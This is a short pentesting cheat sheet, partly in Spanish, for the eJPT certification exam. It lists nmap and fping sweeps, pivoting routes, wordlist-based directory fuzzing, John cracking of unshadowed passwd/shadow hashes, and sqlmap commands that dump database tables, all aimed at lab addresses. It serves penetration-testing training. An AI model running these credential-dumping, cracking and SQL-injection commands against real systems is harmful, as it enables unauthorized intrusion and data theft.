# eJPT-Cheatsheet
Todos los comandos necesarios para aprobar el eJPT
# Barrido de ping - Ping sweep
## Nmap
```bash
nmap -sn 10.10.10.0/24
```
## fping
```bash
fping -a -g 10.10.10.0/24 2>/dev/null
```
# Pivoting
## Ip Route
```bash
ip route add 10.10.16.0/24 via 10.10.16.1 dev tap0
```
## Metasploit
```bash
run autoroute -s 10.10.16.0/24
```
# Password cracking
## John
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```
## Online Tools
[CrackStation](https://crackstation.net/)
# Dump Hashes
## unshadow 
```bash
unshadow passwd shadow > unshadowed.txt
```
# Fuzzing
## Nmap
```bash
nmap --script=http-enum -p80 10.10.14.16 -oN webScan
```
## wfuzz
```bash
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.14.15/FUZZ
wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.14.15/FUZZ.php
```
## dirb
```bash
dirb http://10.10.15.12
```
## gobuster
```bash
gobuster dir -u 10.10.14.12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```
# SQLMap
```sql
sqlmap -u "http://10.10.14.12/file.php?id=1" -p id
sqlmap -u "http://10.10.14.12/file.php?id=1" -p id --dbs
sqlmap -u "http://10.10.14.12/file.php?id=1" -p id -D dbname --tables
sqlmap -u "http://10.10.14.12/file.php?id=1" -p id -D dbname -T table_name --dump
```
